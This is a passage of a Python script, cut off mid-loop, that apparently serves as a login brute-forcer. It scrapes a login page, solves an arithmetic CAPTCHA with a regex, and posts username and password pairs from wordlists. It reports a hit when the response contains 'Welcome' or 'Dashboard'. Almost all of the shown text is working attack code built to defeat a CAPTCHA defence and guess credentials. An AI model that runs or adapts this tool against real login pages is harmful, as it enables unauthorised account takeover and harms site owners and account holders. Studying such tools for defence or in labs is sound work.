import requests
from bs4 import BeautifulSoup
import re
import time
import argparse
import sys

def solve_arithmetic(expression):
    match = re.findall(r"(\d+)\s*([+x*/-])\s*(\d+)", expression)
    if not match:
        return None
    a, op, b = match[0]
    a, b = int(a), int(b)
    if op == "+":
        return a + b
    elif op == "-":
        return a - b
    elif op in ("x", "*"):
        return a * b
    elif op == "/":
        return a // b
    return None

def attempt_login(url, username, password, user_field, pass_field, captcha_field):
    session = requests.Session()
    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    captcha_label = soup.find("label", text=re.compile("Captcha", re.I))
    if not captcha_label:
        print("No CAPTCHA found!")
        return False

    captcha_text = captcha_label.text
    answer = solve_arithmetic(captcha_text)

    if answer is None:
        print(f"Could not solve CAPTCHA: {captcha_text}")
        return False

    payload = {
        user_field: username,
        pass_field: password,
        captcha_field: answer
    }

    result = session.post(url, data=payload)

    if "Welcome" in result.text or "Dashboard" in result.text:
        print(f"[SUCCESS] {username}:{password}")
        return True
    else:
        print(f"[FAILED] {username}:{password}")
        return False

def brute_force(args):
    with open(args.userlist, "r") as ufile:
        usernames = [line.strip() for line in ufile]
    with open(args.passlist, "r") as pfile:
        passwords = [line.strip() for line in pfile]

    for username in usernames: